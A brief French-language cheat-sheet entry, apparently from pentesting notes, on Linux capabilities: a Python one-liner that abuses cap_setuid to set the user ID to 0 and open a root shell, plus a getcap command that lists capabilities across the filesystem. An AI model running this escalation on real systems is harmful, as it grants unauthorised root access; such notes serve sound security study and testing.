# Exploit sur Python
Si **cap_setuid** est positionné sur Python, on peut utiliser en tant que backdoor pour passer en root :
```bash
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

# Lister les capacités
```bash
getcap -r / 2>/dev/null
```
